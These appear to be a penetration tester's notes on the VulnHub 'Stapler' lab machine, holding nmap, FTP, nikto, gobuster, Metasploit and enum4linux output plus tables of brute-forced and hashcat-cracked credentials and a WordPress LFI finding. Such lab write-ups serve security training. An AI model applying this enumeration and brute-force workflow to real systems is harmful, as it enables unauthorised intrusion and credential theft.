# stapler

## Info overview

### Machine

| Hostname | workgroup | OS | 
|----------|-----------|----|
| RED      | WORKGROUP |    |

### Ports and services

| port                      | Service/URL  | Info  |
|---------------------------|--------------|-------|
| 20,21/tcp  | ftp          | vsftpd 2.0.8 or later (vsFTPd 3.0.3 ?) <br> Anonymous FTP login allowed <br> |
| 22/tcp     | ssh          | OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) <br> |
| 53/tcp&udp | dns          | dnsmasq-2.75 <br>  |
| 69/udp     | tftp         | tftp <br>
| 80/tcp     | http         | PHP cli server 5.5 or later <br> |
| 123/tcp    | ntp          | <br> |
| 139/tcp    | smb          | Samba smbd 4.3.9-Ubuntu <br> (workgroup: WORKGROUP) <br> **shares** <br> print$ Mapping: DENIED, Listing: N/A <br> kathy  Mapping: OK, Listing: OK <br> tmp Mapping: OK, Listing: OK <br> IPC$ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \* <br> |
| 666/tcp    | zip file     | see message2.jpg <br> |
| 3306/tcp   | mysql        | MySQL 5.7.12-0ubuntu1 <br> Auth Plugin Name: mysql_native_password  <br> Salt: K \x18Z\x01F>\x1FNku'\%@\x1D7p\x1Fi <br> Some Capabilities: FoundRows, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsTransactions, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins |
| 12380/tcp  | http/https   | Apache httpd 2.4.18 ((Ubuntu)) <br> Content differs between http and https|

### Users, hashes and Passwords

#### users

| users      | Unix | ftp | wp  |
|------------|------|-----|-----|
| peter      | [x]  | []  | [x] |
| RNunemaker | [x]  | []  | []  |
| ETollefson | [x]  | []  | []  |
| DSwanger   | [x]  | []  | []  |
| AParnell   | [x]  | []  | []  |
| SHayslett  | [x]  | []  | []  |
| MBassin    | [x]  | []  | []  |
| JBare      | [x]  | []  | []  |
| LSolum     | [x]  | []  | []  |
| IChadwick  | [x]  | []  | []  |
| MFrei      | [x]  | []  | []  |
| SStroud    | [x]  | []  | []  |
| CCeaser    | [x]  | []  | []  |
| JKanode    | [x]  | []  | []  |
| CJoo       | [x]  | []  | []  |
| Eeth       | [x]  | []  | []  |
| LSolum2    | [x]  | []  | []  |
| JLipps     | [x]  | []  | []  |
| jamie      | [x]  | []  | []  |
| Sam        | [x]  | []  | []  |
| Drew       | [x]  | []  | []  |
| jess       | [x]  | []  | []  |
| SHAY       | [x]  | []  | []  |
| Taylor     | [x]  | []  | []  |
| mel        | [x]  | []  | []  |
| kai        | [x]  | []  | []  |
| zoe        | [x]  | []  | []  |
| NATHAN     | [x]  | []  | []  |
| www        | [x]  | []  | []  |
| elly       | [x]  | [x] | [x] |
| harry      | []   | [x] | [x] |
| john       | []   | [x] | [x] |
| scott      | []   | []  | [x] |
| barry      | []   | []  | [x] |
| heather    | []   | []  | [x] |
| garry      | []   | []  | [x] |
| harry      | []   | []  | [x] |
| kathy      | []   | []  | [x] |
| tim        | []   | []  | [x] |
| pam        | []   | []  | []  |


#### passwords

| Creds               | how did i get it   | what can it access/info  |
|---------------------|--------------------|--------------------------|
| SHayslett:SHayslett | ssh brute          | ssh user                 |
| elly:ylle           | ftp brute          | ftp 'power' user <br> (ssh-> su) user |
| harry:monkey        | wp brute           |                          |
| garry:football      | wp brute           |                          |
| harry:monkey        | wp brute           |                          |
| scott:cookie        | wp brute           |                          |
| kathy:coolgirl      | wp brute           |                          |
| john:incorrect      | wp brute           | wp admin                 |
| root:plbkac         | LFI->wp-config.php | root on mysql/phpmyadmin |
| barry:washere       | dbdump->hashcat    | |
| heather:passphras   | dbdump->hashcat    | |
| tim:thumb           | dbdump->hashcat    | |
| ZOE:partyqueen      | dbdump->hashcat    | |
| dave:damachine      | dbdump->hashcat    | |
| simon:TOM           | dbdump->hashcat    | |
| pam:0520            | dbdump->hashcat <br> info on site (birthday) | |
| mike:12345          | dbdump->hashcat    | found in 'loot' db

#### hashes

| user    | hash                               | cracked     |
|---------|------------------------------------|-------------|
| John    | $P$B7889EMq/erHIuZapMB8GEizebcIy9. | incorrect   |
| Elly    | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 | ylle        |
| Peter   | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |             |
| barry   | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 | washere     |
| heather | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 | passphrase  |
| garry   | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 | football    |
| harry   | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 | monkey      |
| scott   | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 | cookie      |
| kathy   | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 | coolgirl    |
| tim     | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 | thumb       |
| ZOE     | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 | partyqueen  |
| Dave    | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. | damachine   |
| Simon   | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 | TOM         |
| Abby    | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |             |
| Vicki   | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |             |
| Pam     | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 | 0520        |

### Vulns

| Potential Vulns                                                                                         | Verified |
|---------------------------------------------------------------------------------------------------------|----------|
| [WordPress Plugin Advanced Video 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/39646) | [x]


## where you at

192.168.56.10

```
nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:28 CET
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:0A (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.000088s latency).
MAC Address: 08:00:27:42:9E:F7 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.101
Host is up (0.00017s latency).
MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds
```

## what you got

### TCP

```
root@kali:~/Documents/stapler# nmap -p- -A 192.168.56.101 -oA tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:36 CET
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 3.71% done; ETC: 21:39 (0:03:28 remaining)
Nmap scan report for 192.168.56.101
Host is up (0.00050s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 11
|   Capabilities flags: 63487
|   Some Capabilities: FoundRows, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsTransactions, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: K \x18Z\x01F>\x1FNku'\%@\x1D7p\x1Fi
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tim, we need to-do better next year for Initech
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.80%I=7%D=1/5%Time=5E124931%P=x86_64-pc-linux-gnu%r(NULL
SF:,10F8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15
SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04
SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2
SF:\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x
SF:0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb
SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\
SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3
SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0
SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8
SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf
SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd
SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5
SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf
SF:\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\
SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x
SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\x
SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\
SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x
SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x
SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x
SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\
SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x
SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\
SF:xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[
SF:\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc
SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7
SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x
SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96
SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f\
SF:xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4\
SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x
SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc
SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\
SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x
SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf
SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?
SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m58s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2020-01-05T21:38:22+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-01-05T21:38:22
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.50 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.58 seconds
root@kali:~/Documents/stapler# 

```

### UDP

```
root@kali:~/Documents/stapler# nmap -sU -A 192.168.56.101 -oA udp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:34 CET
Nmap scan report for 192.168.56.101
Host is up (0.0020s latency).
Not shown: 995 closed ports
PORT    STATE         SERVICE     VERSION
53/udp  open          domain      dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
68/udp  open|filtered dhcpc
69/udp  open|filtered tftp
137/udp open          netbios-ns  Samba nmbd netbios-ns (workgroup: WORKGROUP)
138/udp open|filtered netbios-dgm
MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: RED

Host script results:
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   2.04 ms 192.168.56.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1211.06 seconds
```

### 192.168.56.101 - 20\tcp 21\tcp

```
ftp  192.168.56.101
Connected to 192.168.56.101.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.56.101:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
ftp> PWD
?Invalid command
ftp> pwd
257 "/" is the current directory
ftp> get note
local: note remote: note
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note (107 bytes).
226 Transfer complete.
107 bytes received in 0.00 secs (117.8040 kB/s)
ftp> 

Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.


Connected to 192.168.56.101.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220 
Name (192.168.56.101:root): elly
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

### 192.168.56.101 - 53\tcp 53\udp

```
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig google.nl @192.168.56.101
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig red @192.168.56.101

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> red @192.168.56.101
;; global options: +cmd
;; connection timed out; no servers could be reached
root@kali:/mnt/hgfs/my-notes-and-snippets/ctfs/vulnhub/stapler# dig a red @192.168.56.101 +trace

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> a red @192.168.56.101 +trace
;; global options: +cmd
;; connection timed out; no servers could be reached
```

### 192.168.56.101 - 69\udp

```
msf5 auxiliary(scanner/tftp/tftpbrute) > show options

Module options (auxiliary/scanner/tftp/tftpbrute):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   CHOST                                                                no        The local client address
   DICTIONARY  /usr/share/metasploit-framework/data/wordlists/tftp.txt  yes       The list of filenames
   RHOSTS                                                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       69                                                       yes       The target port
   THREADS     1                                                        yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
msf5 auxiliary(scanner/tftp/tftpbrute) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/tftp/tftpbrute) > 
```

### 192.168.56.101 - 80\tcp

#### nikto

bashrc and profile have nothing

```
nikto -h 192.168.56.101
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.101
+ Target Hostname:    192.168.56.101
+ Target Port:        80
+ Start Time:         2020-01-05 21:37:20 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3093: /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ OSVDB-3093: /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-01-05 21:37:37 (GMT1) (17 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### gobuster

```
~/go/bin/gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sql,html,txt  -t 40 -e
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.101
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,sql,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/05 21:39:08 Starting gobuster
===============================================================
2020/01/05 21:53:26 Finished
===============================================================
```

### 192.168.56.101 - 123\tcp

```
``` 

### 192.168.56.101 - 139\tcp

#### enum4linux

```
enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan  5 21:52:37 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.101
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.101    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.56.101    |
 ============================================== 
Looking up status of 192.168.56.101
        RED             <00> -         H <ACTIVE>  Workstation Service
        RED             <03> -         H <ACTIVE>  Messenger Service
        RED             <20> -         H <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         H <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.56.101    |
 ======================================= 
[+] Server 192.168.56.101 allows sessions using username '', password ''

 ============================================= 
|    Getting domain SID for 192.168.56.101    |
 ============================================= 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================== 
|    OS information on 192.168.56.101    |
 ======================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.56.101 from smbclient: 
[+] Got OS info for 192.168.56.101 from srvinfo:
        RED            Wk Sv PrQ Unx NT SNT red server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 =============================== 
|    Users on 192.168.56.101    |
 =============================== 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 =========================================== 
|    Share Enumeration on 192.168.56.101    |
 =========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            RED

[+] Attempting to map shares on 192.168.56.101
//192.168.56.101/print$ Mapping: DENIED, Listing: N/A
//192.168.56.101/kathy  Mapping: OK, Listing: OK
//192.168.56.101/tmp    Mapping: OK, Listing: OK
//192.168.56.101/IPC$   [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ====================================================== 
|    Password Policy Information for 192.168.56.101    |
 ====================================================== 


[+] Attaching to 192.168.56.101 using a NULL share

[+] Trying protocol 445/SMB...

        [!] Protocol failed: [Errno Connection error (192.168.56.101:445)] timed out

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] RED
        [+] Builtin

[+] Password Info for Domain: RED

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ================================ 
|    Groups on 192.168.56.101    |
 ================================ 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================= 
|    Users on 192.168.56.101 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-864226560-67800430-3082388513
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\peter (Local User)
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)
[+] Enumerating users using SID S-1-5-21-864226560-67800430-3082388513 and logon username '', password ''
S-1-5-21-864226560-67800430-3082388513-500 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-501 RED\nobody (Local User)
S-1-5-21-864226560-67800430-3082388513-502 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-503 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-504 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-505 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-506 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-507 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-508 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-509 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-510 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-511 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-512 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-513 RED\None (Domain Group)
S-1-5-21-864226560-67800430-3082388513-514 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-515 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-516 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-517 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-518 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-519 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-520 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-521 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-522 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-523 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-524 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-525 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-526 *unknown*\*unknown* (8)
S-1-5-21-864226560-67800430-3082388513-527 *unknown*\*unknown* (8)
